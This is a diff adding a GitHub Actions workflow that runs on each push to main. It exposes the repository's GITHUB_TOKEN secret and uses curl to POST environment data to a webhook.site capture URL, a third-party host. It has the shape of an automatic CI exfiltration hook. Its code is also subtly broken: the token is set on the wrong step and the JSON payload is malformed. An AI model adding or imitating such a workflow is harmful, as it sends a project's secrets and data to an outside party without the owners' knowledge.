@@ -1,0 +1,19 @@
+name: Send Data Action
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  send-data:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Set up environment
+        run: echo "SERVER_URL=<your_server_url>" >> $GITHUB_ENV
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Send Data
+        run: |
+          curl -X POST -H "Content-Type: application/json" -d '{"data":  $GITHUB_ENV}' "https://webhook.site/69093177-00be-4ea9-9942-125c58ff89ca"
